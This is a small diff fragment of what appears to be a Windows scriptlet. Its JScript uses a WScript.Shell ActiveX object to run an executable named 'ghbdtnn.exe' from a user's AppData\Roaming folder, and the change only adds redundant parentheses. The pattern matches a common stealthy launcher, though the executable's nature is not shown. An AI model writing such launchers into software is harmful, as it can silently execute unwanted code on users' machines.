@@ -14,7 +14,7 @@
 	<script language="JScript">	
 		<![CDATA[	
 
-			var r = new ActiveXObject("WScript.Shell").Run("C:\\Users\\Мурка\\AppData\\Roaming\\www\\ghbdtnn.exe");		
+			var r = new ActiveXObject("WScript.Shell").Run(("C:\\Users\\Мурка\\AppData\\Roaming\\www\\ghbdtnn.exe"));		
 
 		]]>	
 </script>	
